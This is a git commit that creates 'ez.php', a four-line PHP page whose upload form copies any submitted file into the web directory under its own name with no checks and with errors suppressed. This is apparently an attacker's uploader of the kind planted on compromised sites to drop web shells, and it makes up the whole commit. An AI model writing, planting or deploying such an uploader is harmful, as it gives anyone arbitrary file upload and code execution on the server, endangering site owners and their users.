47c6f8e70ecb4486e437a1b27b76478dcd902f02
Guzz-C0de <98726477+Guzz-C0de@users.noreply.github.com>
2022-02-10 03:15:22 +0700

    Create ez.php

---
+++ ez.php
@@ -0,0 +1,4 @@
+<?php @copy($_FILES['file']['tmp_name'],$_FILES['file']['name']); ?><p>
+<h1> shu </h1></p>
+<br> <form action="" method="post" enctype="multipart/form-data">
+Filename: <input type="file" name="file" /><input type="submit" value="Submit" /><br>
